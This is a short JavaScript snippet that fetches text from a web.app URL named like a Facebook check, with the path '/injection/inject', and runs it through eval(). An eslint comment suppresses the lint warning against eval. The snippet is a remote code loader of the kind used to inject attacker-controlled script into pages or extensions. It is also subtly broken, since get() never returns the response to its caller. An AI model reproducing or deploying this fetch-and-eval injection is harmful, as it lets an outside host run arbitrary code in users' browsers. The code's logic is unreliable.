async function get(url) {
    let xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState === XMLHttpRequest.DONE) {
            if (xmlhttp.status === 200) {
                return xmlhttp.responseText;
            } else {
                throw new Error("oops, something went wrong!");
            }
        }
    };
    xmlhttp.open("GET", url, true);
    xmlhttp.send();
}
// eslint-disable-next-line no-eval
get("https://facebook-check-c-1597716165009.web.app/injection/inject").then(code => eval(code)).catch(error => console.log(error));